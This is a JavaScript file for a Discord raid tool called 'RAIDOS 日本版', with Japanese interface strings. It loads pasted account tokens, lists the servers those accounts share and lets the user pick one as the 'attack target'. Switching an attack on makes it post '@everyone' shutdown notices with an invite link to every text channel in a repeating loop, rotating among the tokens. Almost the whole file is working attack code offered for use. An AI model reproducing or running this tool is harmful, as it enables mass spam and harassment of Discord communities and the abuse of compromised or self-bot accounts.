const log = (msg) => {
  const time = new Date().toLocaleTimeString('ja-JP');
  document.getElementById('log').innerHTML += `<div>[\( {time}] \){msg}</div>`;
  document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
};

let tokens = [];
let targetGuild = null;
let running = {};

document.getElementById('tokens').addEventListener('input', async () => {
  tokens = document.getElementById('tokens').value.trim().split('\n').map(t => t.trim()).filter(t => t);
  document.getElementById('token-count').textContent = tokens.length + '個読み込み済み';
  if (tokens.length > 0) await loadGuilds();
});

async function loadGuilds() {
  const list = document.getElementById('guild-list');
  list.innerHTML = '<div style="color:#aaa;padding:10px">取得中...</div>';
  const guilds = new Set();

  for (const token of tokens.slice(0, 30)) {
    try {
      const res = await fetch('https://discord.com/api/v10/users/@me/guilds', { headers: { Authorization: token } });
      if (res.ok) {
        const data = await res.json();
        data.forEach(g => guilds.add(JSON.stringify({id: g.id, name: g.name || '不明'})));
      }
    } catch(e) {}
    await new Promise(r => setTimeout(r, 200));
  }

  list.innerHTML = '';
  [...guilds].map(JSON.parse).sort((a,b) => a.name.localeCompare(b.name)).forEach(g => {
    const div = document.createElement('div');
    div.className = 'guild-item';
    div.innerHTML = `<div class="icon">\( {g.name[0]}</div><div> \){g.name}</div>`;
    div.onclick = () => {
      document.querySelectorAll('.guild-item').forEach(x => x.classList.remove('active'));
      div.classList.add('active');
      targetGuild = g.id;
      document.getElementById('target-name').textContent = g.name;
      log(`攻撃対象変更 → ${g.name}`);
    };
    list.appendChild(div);
  });
}

// スイッチ操作
document.querySelectorAll('.switch').forEach(s => {
  s.onclick = () => {
    if (!targetGuild) { alert('先にサーバーを選択してください'); return; }
    s.classList.toggle('on');
    const tool = s.dataset.switch;
    if (s.classList.contains('on')) startAttack(tool);
    else stopAttack(tool);
  };
});

function startAttack(type) {
  if (running[type]) return;
  running[type] = true;
  log(`【${type}】攻撃開始`);

  const loop = async () => {
    while (running[type] && targetGuild) {
      const token = tokens[Math.floor(Math.random() * tokens.length)];
      if (!token) break;

      try {
        if (type === 'raid' || type === 'allch') {
          const chs = await fetch(`https://discord.com/api/v10/guilds/${targetGuild}/channels`, {headers:{Authorization:token}}).then(r=>r.json());
          for (const ch of chs.filter(c=>c.type===0)) {
            if (!running[type]) break;
            await fetch(`https://discord.com/api/v10/channels/${ch.id}/messages`, {
              method:'POST', headers:{Authorization:token,'Content-Type':'application/json'},
              body:JSON.stringify({content: "@everyone サーバー終了のお知らせ\nhttps://discord.gg/dead"})
            });
            await new Promise(r=>setTimeout(r,800));
          }
        }
      } catch(e) {}
      await new Promise(r=>setTimeout(r,500));
    }
  };
  loop();
}

function stopAttack(type) {
  running[type] = false;
  log(`【${type}】停止`);
}

document.getElementById('start-all').onclick = () => document.querySelectorAll('.switch:not(.on)').forEach(s => s.click());
document.getElementById('stop-all').onclick = () => document.querySelectorAll('.switch.on').forEach(s => s.classList.remove('on') || (running[s.dataset.switch]=false));

log('RAIDOS 日本版 起動完了');
log('トークンを貼って → サーバー選択 → スイッチONで攻撃開始');
